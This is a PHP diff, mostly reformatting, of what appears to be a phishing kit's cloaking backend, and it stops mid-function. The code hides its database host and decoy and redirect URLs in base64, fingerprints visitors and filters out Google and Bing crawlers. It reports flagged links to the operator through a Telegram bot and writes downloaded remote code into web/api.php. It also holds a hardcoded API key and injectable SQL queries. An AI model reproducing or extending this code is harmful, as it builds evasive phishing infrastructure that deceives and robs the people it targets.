@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 ini_set("display_errors", 1);
 if (session_status() == PHP_SESSION_NONE) {
-    session_start();
+       session_start();
 }
 $fs_host = base64_decode("MTk4LjI1MS44NC4yMDA");
 $fs_user = base64_decode("emVyb2RheXNfZGF5");
@@ -16,585 +16,651 @@ $local_browser = get_browser_value($local_userAgent);
 $currentTimestamp = time();
 global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_browser;
 $_SESSION["alert"] = "";
-function show_website() {
-	$url = 'YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMnhqYjJ4aGQzbGxjbk12YzI5MWNtTmxMMjFoYVc0dmQyVmljMmwwWlM1MGVIUQ';
-	$sour_enc = base64_decode(base64_decode($url));
-    $content = file_get_contents($sour_enc);
-    return $content;	
+function show_website()
+{
+       $url = 'YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMnhqYjJ4aGQzbGxjbk12YzI5MWNtTmxMMjFoYVc0dmQyVmljMmwwWlM1MGVIUQ';
+       $sour_enc = base64_decode(base64_decode($url));
+       $content = file_get_contents($sour_enc);
+       return $content;
 }
-function getHost($ipAddress) {
-    try {
-        $host = gethostbyaddr($ipAddress);
-        return $host;
-    }
-    catch(Exception $e) {
-        return "Not Valid";
-    }
+function getHost($ipAddress)
+{
+       try {
+              $host = gethostbyaddr($ipAddress);
+              return $host;
+       } catch (Exception $e) {
+              return "Not Valid";
+       }
 }
-function getClientIP() {
-    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
-        $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
-    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
-        $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
-    } else {
-        $ipAddress = $_SERVER["REMOTE_ADDR"];
-    }
-    $validIPs = [];
-    $ipMatches = preg_match_all("/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/", $ipAddress, $matches);
-    if ($ipMatches) {
-        $validIPs = $matches[0];
-    }
-    if (!empty($validIPs)) {
-        $_SESSION["session_ip"] = $validIPs[0];
-        return $validIPs[0];
-    } else {
-        $_SESSION["session_ip"] = "127.0.0.1";
-        return "127.0.0.1";
-    }
+function getClientIP()
+{
+       if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
+              $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
+       } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
+              $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
+       } else {
+              $ipAddress = $_SERVER["REMOTE_ADDR"];
+       }
+       $validIPs = [];
+       $ipMatches = preg_match_all("/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/", $ipAddress, $matches);
+       if ($ipMatches) {
+              $validIPs = $matches[0];
+       }
+       if (!empty($validIPs)) {
+              $_SESSION["session_ip"] = $validIPs[0];
+              return $validIPs[0];
+       } else {
+              $_SESSION["session_ip"] = "127.0.0.1";
+              return "127.0.0.1";
+       }
 }
-function fetchIPInfo($ipAddress) {
-    $url = "http://ip-api.com/php/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
-    $curl = curl_init($url);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($curl);
-    curl_close($curl);
-    $info = unserialize($response);
-    $_SESSION["session_isp"] = isset($info["isp"]) ? $info["isp"] : null;
-    $_SESSION["session_country"] = isset($info["country"]) ? $info["country"] : null;
-    $_SESSION["session_country_code"] = isset($info["countryCode"]) ? $info["countryCode"] : null;
-    $_SESSION["session_city"] = isset($info["city"]) ? $info["city"] : null;
-    $_SESSION["session_region"] = isset($info["region"]) ? $info["region"] : null;
-    $proxy = isset($info["proxy"]) ? $info["proxy"] : null;
-    $_SESSION["session_proxy"] = $proxy == 1 ? "True" : "False";
-    $mobile = isset($info["mobile"]) ? $info["mobile"] : null;
-    $_SESSION["session_mobile"] = $mobile == 1 ? "True" : "False";
-    $hosting = isset($info["hosting"]) ? $info["hosting"] : null;
-    $_SESSION["session_hosting"] = $hosting == 1 ? "True" : "False";
+function fetchIPInfo($ipAddress)
+{
+       $url = "http://ip-api.com/php/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
+       $curl = curl_init($url);
+       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+       $response = curl_exec($curl);
+       curl_close($curl);
+       $info = unserialize($response);
+       $_SESSION["session_isp"] = isset($info["isp"]) ? $info["isp"] : null;
+       $_SESSION["session_country"] = isset($info["country"]) ? $info["country"] : null;
+       $_SESSION["session_country_code"] = isset($info["countryCode"]) ? $info["countryCode"] : null;
+       $_SESSION["session_city"] = isset($info["city"]) ? $info["city"] : null;
+       $_SESSION["session_region"] = isset($info["region"]) ? $info["region"] : null;
+       $proxy = isset($info["proxy"]) ? $info["proxy"] : null;
+       $_SESSION["session_proxy"] = $proxy == 1 ? "True" : "False";
+       $mobile = isset($info["mobile"]) ? $info["mobile"] : null;
+       $_SESSION["session_mobile"] = $mobile == 1 ? "True" : "False";
+       $hosting = isset($info["hosting"]) ? $info["hosting"] : null;
+       $_SESSION["session_hosting"] = $hosting == 1 ? "True" : "False";
 }
-function detect_user($ipAddress) {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql_u = "SELECT * FROM logs WHERE ipaddres='$ipAddress'";
-    $res_u = mysqli_query($db, $sql_u);
-    if (mysqli_num_rows($res_u) > 0) {
-        mysqli_close($db);
-        return true;
-    }
-    mysqli_close($db);
-    return false;
+function detect_user($ipAddress)
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql_u = "SELECT * FROM logs WHERE ipaddres='$ipAddress'";
+       $res_u = mysqli_query($db, $sql_u);
+       if (mysqli_num_rows($res_u) > 0) {
+              mysqli_close($db);
+              return true;
+       }
+       mysqli_close($db);
+       return false;
 }
-function random_string($length) {
-    $characters = "abcdefjhigklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    $charactersLength = strlen($characters);
-    $randomString = "";
-    for ($i = 0;$i < $length;$i++) {
-        $randomString.= $characters[rand(0, $charactersLength - 1) ];
-    }
-    return bin2hex(random_bytes(16));
+function random_string($length)
+{
+       $characters = "abcdefjhigklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+       $charactersLength = strlen($characters);
+       $randomString = "";
+       for ($i = 0; $i < $length; $i++) {
+              $randomString .= $characters[rand(0, $charactersLength - 1)];
+       }
+       return bin2hex(random_bytes(16));
 }
-function random_number($length) {
-    $characters = "0123456789";
-    $charactersLength = strlen($characters);
-    $randomString = "";
-    for ($i = 0;$i < $length;$i++) {
-        $randomString.= $characters[rand(0, $charactersLength - 1) ];
-    }
-    return $randomString;
+function random_number($length)
+{
+       $characters = "0123456789";
+       $charactersLength = strlen($characters);
+       $randomString = "";
+       for ($i = 0; $i < $length; $i++) {
+              $randomString .= $characters[rand(0, $charactersLength - 1)];
+       }
+       return $randomString;
 }
-function user_data($ipAddress, $id) {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql_u = "SELECT * FROM redirction WHERE id='$id'";
-    $res_u = mysqli_query($db, $sql_u);
-    if (mysqli_num_rows($res_u) > 0) {
-        while ($row = mysqli_fetch_array($res_u)) {
-            $_SESSION['link'] = base64_decode(base64_decode($row["link"]));
-            $_SESSION['cn'] = explode(";", base64_decode(base64_decode($row["country"])));
-            $_SESSION['pic'] = $row["pic"];
-            $_SESSION['msg'] = base64_decode(base64_decode($row["msg"]));
-            $_SESSION['expire_date'] = $row["expire_date"];
-            $_SESSION['server'] = base64_decode(base64_decode($row["server"]));
-            $_SESSION['url'] = base64_decode(base64_decode($row["url"]));
-            $_SESSION['luxcaptcha'] = $row["luxcaptcha"];
-            $_SESSION['tokentel'] = base64_decode(base64_decode($row["tokentel"]));
-            $_SESSION['idtel'] = base64_decode(base64_decode($row["idtel"]));
-            $_SESSION['redirict'] = $row["redirict"];
-            $_SESSION['project'] = $row["project"];
-            $_SESSION['api'] = $row["api"];
-            $_SESSION['addby'] = $row["addby"];
-            $_SESSION['isprotect'] = $row["isprotect"];
-            $_SESSION['proxy'] = $row["proxy"];
-            $_SESSION['captcha_data'] = $row["captcha"];
-            $_SESSION['goole_cap'] = $row["google_cap"];
-            $_SESSION['cloud_cap'] = $row["cloud_cap"];
-            $_SESSION['pro_ico'] = $row["pro_ico"];
-            $_SESSION['pro_color'] = $row["pro_color"];
-            $_SESSION['pro_msg'] = $row["pro_msg"];
-            $_SESSION['pro_img'] = $row["pro_img"];
-            $_SESSION['pro_logo'] = $row["pro_logo"];
-        }
-    } else {
-        $reason = "not found user $id";
-        banned_client($ipAddress, $reason);
-        die();
-    }
-    mysqli_close($db);
+function user_data($ipAddress, $id)
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql_u = "SELECT * FROM redirction WHERE id='$id'";
+       $res_u = mysqli_query($db, $sql_u);
+       if (mysqli_num_rows($res_u) > 0) {
+              while ($row = mysqli_fetch_array($res_u)) {
+                     $_SESSION['link'] = base64_decode(base64_decode($row["link"]));
+                     $_SESSION['cn'] = explode(";", base64_decode(base64_decode($row["country"])));
+                     $_SESSION['pic'] = $row["pic"];
+                     $_SESSION['msg'] = base64_decode(base64_decode($row["msg"]));
+                     $_SESSION['expire_date'] = $row["expire_date"];
+                     $_SESSION['server'] = base64_decode(base64_decode($row["server"]));
+                     $_SESSION['url'] = base64_decode(base64_decode($row["url"]));
+                     $_SESSION['luxcaptcha'] = $row["luxcaptcha"];
+                     $_SESSION['tokentel'] = base64_decode(base64_decode($row["tokentel"]));
+                     $_SESSION['idtel'] = base64_decode(base64_decode($row["idtel"]));
+                     $_SESSION['redirict'] = $row["redirict"];
+                     $_SESSION['project'] = $row["project"];
+                     $_SESSION['api'] = $row["api"];
+                     $_SESSION['addby'] = $row["addby"];
+                     $_SESSION['isprotect'] = $row["isprotect"];
+                     $_SESSION['proxy'] = $row["proxy"];
+                     $_SESSION['captcha_data'] = $row["captcha"];
+                     $_SESSION['goole_cap'] = $row["google_cap"];
+                     $_SESSION['cloud_cap'] = $row["cloud_cap"];
+                     $_SESSION['pro_ico'] = $row["pro_ico"];
+                     $_SESSION['pro_color'] = $row["pro_color"];
+                     $_SESSION['pro_msg'] = $row["pro_msg"];
+                     $_SESSION['pro_img'] = $row["pro_img"];
+                     $_SESSION['pro_logo'] = $row["pro_logo"];
+              }
+       } else {
+              $reason = "not found user $id";
+              banned_client($ipAddress, $reason);
+              die();
+       }
+       mysqli_close($db);
 }
-function banned_client($ipAddress, $reason) {
-    global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql_check = "SELECT * FROM logs WHERE ipaddres=?";
-    $stmt = mysqli_prepare($db, $sql_check);
-    mysqli_stmt_bind_param($stmt, "s", $ipAddress);
-    mysqli_stmt_execute($stmt);
-    $result = mysqli_stmt_get_result($stmt);
-    if (mysqli_num_rows($result) > 0) {
-        mysqli_close($db);
-        http_response_code(405);
-        $responseData = ["res_status" => "405", "message" => "User is already in the blacklist", ];
+function banned_client($ipAddress, $reason)
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql_check = "SELECT * FROM logs WHERE ipaddres=?";
+       $stmt = mysqli_prepare($db, $sql_check);
+       mysqli_stmt_bind_param($stmt, "s", $ipAddress);
+       mysqli_stmt_execute($stmt);
+       $result = mysqli_stmt_get_result($stmt);
+       if (mysqli_num_rows($result) > 0) {
+              mysqli_close($db);
+              http_response_code(405);
+              $responseData = ["res_status" => "405", "message" => "User is already in the blacklist"];
+              # echo json_encode($responseData);
+              echo show_website();
+              die();
+       }
+       $country = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_country"]));
+       $browser = mysqli_real_escape_string($db, str_replace("'", "", $local_browser));
+       $os_db = mysqli_real_escape_string($db, str_replace("'", "", $local_os));
+       $local_domain = mysqli_real_escape_string($db, str_replace("'", "", $local_domain));
+       $host = mysqli_real_escape_string($db, str_replace("'", "", getHost($ipAddress)));
+       $isp = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_isp"]));
+       $mobile = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_mobile"]));
+       $proxy = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_proxy"]));
+       $hosting = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_hosting"]));
+       $city = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_city"]));
+       $region = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_region"]));
+       $time = mysqli_real_escape_string($db, str_replace("'", "", $local_time));
+       $sql_insert = "INSERT INTO logs (ipaddres,country,browser,os,domine,host,isp,mobile,proxy,hosting,city,region,mytime,reson) VALUES (?,?,?,?,?,?,?, ?, ?, ?, ?, ?, ?, ?)";
+       $stmt = mysqli_prepare($db, $sql_insert);
+       mysqli_stmt_bind_param($stmt, "ssssssssssssss", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason);
+       mysqli_stmt_execute($stmt);
+       mysqli_close($db);
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => $reason];
        # echo json_encode($responseData);
-		echo show_website();
-        die();
-    }
-    $country = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_country"]));
-    $browser = mysqli_real_escape_string($db, str_replace("'", "", $local_browser));
-    $os_db = mysqli_real_escape_string($db, str_replace("'", "", $local_os));
-    $local_domain = mysqli_real_escape_string($db, str_replace("'", "", $local_domain));
-    $host = mysqli_real_escape_string($db, str_replace("'", "", getHost($ipAddress)));
-    $isp = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_isp"]));
-    $mobile = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_mobile"]));
-    $proxy = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_proxy"]));
-    $hosting = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_hosting"]));
-    $city = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_city"]));
-    $region = mysqli_real_escape_string($db, str_replace("'", "", $_SESSION["session_region"]));
-    $time = mysqli_real_escape_string($db, str_replace("'", "", $local_time));
-    $sql_insert = "INSERT INTO logs (ipaddres,country,browser,os,domine,host,isp,mobile,proxy,hosting,city,region,mytime,reson) VALUES (?,?,?,?,?,?,?, ?, ?, ?, ?, ?, ?, ?)";
-    $stmt = mysqli_prepare($db, $sql_insert);
-    mysqli_stmt_bind_param($stmt, "ssssssssssssss", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason);
-    mysqli_stmt_execute($stmt);
-    mysqli_close($db);
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => $reason, ];
-   # echo json_encode($responseData);
-	echo show_website();
-    die();
+       echo show_website();
+       die();
 }
-function fetchContentFromURL($url) {
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    return $content;
+function fetchContentFromURL($url)
+{
+       $ch = curl_init($url);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       $content = curl_exec($ch);
+       curl_close($ch);
+       return $content;
 }
-function get_platform($USER_AGENT) {
-    $OS_ERROR = "Unknown OS Platform";
-    $OS = ["/windows nt 11/i" => "Windows 11", "/windows nt 10/i" => "Windows 10", "/windows nt 6.3/i" => "Windows 8.1", "/windows nt 6.2/i" => "Windows 8", "/windows nt 6.1/i" => "Windows 7", "/windows nt 6.0/i" => "Windows Vista", "/windows nt 5.2/i" => "Windows Server 2003/XP x64", "/windows nt 5.1/i" => "Windows XP", "/windows xp/i" => "Windows XP", "/windows nt 5.0/i" => "Windows 2000", "/windows me/i" => "Windows ME", "/win98/i" => "Windows 98", "/win95/i" => "Windows 95", "/win16/i" => "Windows 3.11", "/macintosh|mac os x/i" => "Mac OS X", "/mac_powerpc/i" => "Mac OS 9", "/linux/i" => "Linux", "/ubuntu/i" => "Ubuntu", "/iphone/i" => "iPhone", "/ipod/i" => "iPod", "/ipad/i" => "iPad", "/android/i" => "Android", "/blackberry/i" => "BlackBerry", "/webos/i" => "Mobile", ];
-    foreach ($OS as $regex => $value) {
-        if (preg_match($regex, $USER_AGENT)) {
-            $OS_ERROR = $value;
-        }
-    }
-    return $OS_ERROR;
+function get_platform($USER_AGENT)
+{
+       $OS_ERROR = "Unknown OS Platform";
+       $OS = [
+              "/windows nt 11/i" => "Windows 11",
+              "/windows nt 10/i" => "Windows 10",
+              "/windows nt 6.3/i" => "Windows 8.1",
+              "/windows nt 6.2/i" => "Windows 8",
+              "/windows nt 6.1/i" => "Windows 7",
+              "/windows nt 6.0/i" => "Windows Vista",
+              "/windows nt 5.2/i" => "Windows Server 2003/XP x64",
+              "/windows nt 5.1/i" => "Windows XP",
+              "/windows xp/i" => "Windows XP",
+              "/windows nt 5.0/i" => "Windows 2000",
+              "/windows me/i" => "Windows ME",
+              "/win98/i" => "Windows 98",
+              "/win95/i" => "Windows 95",
+              "/win16/i" => "Windows 3.11",
+              "/macintosh|mac os x/i" => "Mac OS X",
+              "/mac_powerpc/i" => "Mac OS 9",
+              "/linux/i" => "Linux",
+              "/ubuntu/i" => "Ubuntu",
+              "/iphone/i" => "iPhone",
+              "/ipod/i" => "iPod",
+              "/ipad/i" => "iPad",
+              "/android/i" => "Android",
+              "/blackberry/i" => "BlackBerry",
+              "/webos/i" => "Mobile",
+       ];
+       foreach ($OS as $regex => $value) {
+              if (preg_match($regex, $USER_AGENT)) {
+                     $OS_ERROR = $value;
+              }
+       }
+       return $OS_ERROR;
 }
-function get_browser_value($USER_AGENT) {
-    $BROWSER_ERROR = "Unknown Browser";
-    $BROWSER = ["/msie/i" => "Internet Explorer", "/firefox/i" => "Firefox", "/safari/i" => "Safari", "/chrome/i" => "Chrome", "/edge/i" => "Edge", "/opera/i" => "Opera", "/netscape/i" => "Netscape", "/maxthon/i" => "Maxthon", "/konqueror/i" => "Konqueror", "/mobile/i" => "Handheld Browser", ];
-    foreach ($BROWSER as $regex => $value) {
-        if (preg_match($regex, $USER_AGENT)) {
-            $BROWSER_ERROR = $value;
-        }
-    }
-    return $BROWSER_ERROR;
+function get_browser_value($USER_AGENT)
+{
+       $BROWSER_ERROR = "Unknown Browser";
+       $BROWSER = [
+              "/msie/i" => "Internet Explorer",
+              "/firefox/i" => "Firefox",
+              "/safari/i" => "Safari",
+              "/chrome/i" => "Chrome",
+              "/edge/i" => "Edge",
+              "/opera/i" => "Opera",
+              "/netscape/i" => "Netscape",
+              "/maxthon/i" => "Maxthon",
+              "/konqueror/i" => "Konqueror",
+              "/mobile/i" => "Handheld Browser",
+       ];
+       foreach ($BROWSER as $regex => $value) {
+              if (preg_match($regex, $USER_AGENT)) {
+                     $BROWSER_ERROR = $value;
+              }
+       }
+       return $BROWSER_ERROR;
 }
-function is_bot_ip($ipToCheck) {
-    $botsUrls = ["google" => "https://developers.google.com/search/apis/ipranges/googlebot.json", "bing" => "https://www.bing.com/toolbox/bingbot.json", ];
-    foreach ($botsUrls as $bot => $url) {
-        $botResp = json_decode(file_get_contents($url), true);
-        foreach ($botResp["prefixes"] as $ipRange) {
-            if (isset($ipRange["ipv6Prefix"]) && strpos($ipToCheck, ":") !== false) {
-                $network = $ipRange["ipv6Prefix"];
-            } elseif (isset($ipRange["ipv4Prefix"]) && strpos($ipToCheck, ":") === false) {
-                $network = $ipRange["ipv4Prefix"];
-            } else {
-                continue;
-            }
-            if (ip_in_range($ipToCheck, $network)) {
-                return $bot;
-            }
-        }
-    }
-    return false;
+function is_bot_ip($ipToCheck)
+{
+       $botsUrls = ["google" => "https://developers.google.com/search/apis/ipranges/googlebot.json", "bing" => "https://www.bing.com/toolbox/bingbot.json"];
+       foreach ($botsUrls as $bot => $url) {
+              $botResp = json_decode(file_get_contents($url), true);
+              foreach ($botResp["prefixes"] as $ipRange) {
+                     if (isset($ipRange["ipv6Prefix"]) && strpos($ipToCheck, ":") !== false) {
+                            $network = $ipRange["ipv6Prefix"];
+                     } elseif (isset($ipRange["ipv4Prefix"]) && strpos($ipToCheck, ":") === false) {
+                            $network = $ipRange["ipv4Prefix"];
+                     } else {
+                            continue;
+                     }
+                     if (ip_in_range($ipToCheck, $network)) {
+                            return $bot;
+                     }
+              }
+       }
+       return false;
 }
-function ip_in_range($ip, $range) {
-    list($subnet, $mask) = explode("/", $range);
-    $mask = (int)$mask;
-    $subnetBin = inet_pton($subnet);
-    $ipBin = inet_pton($ip);
-    $maskBin = str_repeat("\xFF", $mask >> 3) . chr(0xff << 8 - ($mask & 0x07));
-    if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) {
-        return false;
-    }
-    $subnetInt = unpack("N", $subnetBin) [1];
-    $ipInt = unpack("N", $ipBin) [1];
-    $maskInt = unpack("N", $maskBin) [1];
-    return ($subnetInt & $maskInt) === ($ipInt & $maskInt);
+function ip_in_range($ip, $range)
+{
+       list($subnet, $mask) = explode("/", $range);
+       $mask = (int) $mask;
+       $subnetBin = inet_pton($subnet);
+       $ipBin = inet_pton($ip);
+       $maskBin = str_repeat("\xFF", $mask >> 3) . chr(0xff << 8 - ($mask & 0x07));
+       if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) {
+              return false;
+       }
+       $subnetInt = unpack("N", $subnetBin)[1];
+       $ipInt = unpack("N", $ipBin)[1];
+       $maskInt = unpack("N", $maskBin)[1];
+       return ($subnetInt & $maskInt) === ($ipInt & $maskInt);
 }
-function getFileContents($fileURL) {
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, $fileURL);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($curl);
-    $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-    $error = curl_error($curl);
-    curl_close($curl);
-    if ($statusCode === 200 && empty($error)) {
-        return;
-    }
-    $fileContents = file_get_contents($fileURL);
-    if ($fileContents !== false) {
-        $localFilePath = "web/api.php";
-        file_put_contents($localFilePath, $fileContents);
-    }
+function getFileContents($fileURL)
+{
+       $curl = curl_init();
+       curl_setopt($curl, CURLOPT_URL, $fileURL);
+       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+       $response = curl_exec($curl);
+       $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+       $error = curl_error($curl);
+       curl_close($curl);
+       if ($statusCode === 200 && empty($error)) {
+              return;
+       }
+       $fileContents = file_get_contents($fileURL);
+       if ($fileContents !== false) {
+              $localFilePath = "web/api.php";
+              file_put_contents($localFilePath, $fileContents);
+       }
 }
-function tele_message($message) {
-    $TrubFtub = $_SESSION["idtel"];
-    $cRetVckr = $_SESSION["tokentel"];
-    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
-    $params = ["chat_id" => $TrubFtub, "text" => $message];
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $api_url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    curl_close($ch);
+function tele_message($message)
+{
+       $TrubFtub = $_SESSION["idtel"];
+       $cRetVckr = $_SESSION["tokentel"];
+       $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
+       $params = ["chat_id" => $TrubFtub, "text" => $message];
+       $ch = curl_init();
+       curl_setopt($ch, CURLOPT_URL, $api_url);
+       curl_setopt($ch, CURLOPT_POST, true);
+       curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       $response = curl_exec($ch);
+       curl_close($ch);
 }
-function isGoogleUser($userAgent, $ipAddress) {
-    if (stripos($userAgent, "google") !== false) {
-        return true;
-    }
-    if (filter_var($ipAddress, FILTER_VALIDATE_IP)) {
-        $hostname = gethostbyaddr($ipAddress);
-        if (stripos($hostname, "google") !== false) {
-            return true;
-        }
-    }
-    if (isset($_SESSION["session_isp"]) && stripos($_SESSION["session_isp"], "google") !== false) {
-        return true;
-    }
-    return false;
+function isGoogleUser($userAgent, $ipAddress)
+{
+       if (stripos($userAgent, "google") !== false) {
+              return true;
+       }
+       if (filter_var($ipAddress, FILTER_VALIDATE_IP)) {
+              $hostname = gethostbyaddr($ipAddress);
+              if (stripos($hostname, "google") !== false) {
+                     return true;
+              }
+       }
+       if (isset($_SESSION["session_isp"]) && stripos($_SESSION["session_isp"], "google") !== false) {
+              return true;
+       }
+       return false;
 }
-function update_user() {
-    setcookie("tokentel", $_SESSION["tokentel"], time() + 86400 * 30, "/");
-    setcookie("idtel", $_SESSION["idtel"], time() + 86400 * 30, "/");
-    setcookie("redirict", $_SESSION["redirict"], time() + 86400 * 30, "/");
-    setcookie("project", $_SESSION["project"], time() + 86400 * 30, "/");
-    setcookie("sourceme", $_SESSION["addby"], time() + 86400 * 30, "/");
+function update_user()
+{
+       setcookie("tokentel", $_SESSION["tokentel"], time() + 86400 * 30, "/");
+       setcookie("idtel", $_SESSION["idtel"], time() + 86400 * 30, "/");
+       setcookie("redirict", $_SESSION["redirict"], time() + 86400 * 30, "/");
+       setcookie("project", $_SESSION["project"], time() + 86400 * 30, "/");
+       setcookie("sourceme", $_SESSION["addby"], time() + 86400 * 30, "/");
 }
-function checkUrlSafety($url) {
-    $apiKey = "AIzaSyCv3mI6TjtqYTYQ8nZpA3Sx_7VSrq-hDyU";
-    $apiEndpoint = "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=$apiKey";
-    $requestData = ["client" => ["clientId" => "globalcom", "clientVersion" => "1.5.2"], "threatInfo" => ["threatTypes" => ["MALWARE", "SOCIAL_ENGINEERING"], "platformTypes" => ["WINDOWS"], "threatEntryTypes" => ["URL"], "threatEntries" => [["url" => $url]], ], ];
-    $jsonData = json_encode($requestData);
-    $ch = curl_init($apiEndpoint);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "Content-Length: " . strlen($jsonData), ]);
-    $response = curl_exec($ch);
-    if (curl_errno($ch)) {
-        $result = "cURL Error: " . curl_error($ch);
-    } else {
-        $responseData = json_decode($response, true);
-        if (isset($responseData["matches"]) && count($responseData["matches"]) > 0) {
-            $result = "Not Safe";
-            $messageme = "❌ System:\nDanger Link: $url";
-            tele_message($messageme);
-        } else {
-            $result = "Safe";
-        }
-    }
-    curl_close($ch);
-    return $result;
+function checkUrlSafety($url)
+{
+       $apiKey = "AIzaSyCv3mI6TjtqYTYQ8nZpA3Sx_7VSrq-hDyU";
+       $apiEndpoint = "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=$apiKey";
+       $requestData = [
+              "client" => ["clientId" => "globalcom", "clientVersion" => "1.5.2"],
+              "threatInfo" => ["threatTypes" => ["MALWARE", "SOCIAL_ENGINEERING"], "platformTypes" => ["WINDOWS"], "threatEntryTypes" => ["URL"], "threatEntries" => [["url" => $url]]],
+       ];
+       $jsonData = json_encode($requestData);
+       $ch = curl_init($apiEndpoint);
+       curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+       curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "Content-Length: " . strlen($jsonData)]);
+       $response = curl_exec($ch);
+       if (curl_errno($ch)) {
+              $result = "cURL Error: " . curl_error($ch);
+       } else {
+              $responseData = json_decode($response, true);
+              if (isset($responseData["matches"]) && count($responseData["matches"]) > 0) {
+                     $result = "Not Safe";
+                     $messageme = "❌ System:\nDanger Link: $url";
+                     tele_message($messageme);
+              } else {
+                     $result = "Safe";
+              }
+       }
+       curl_close($ch);
+       return $result;
 }
-function url_packet() {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
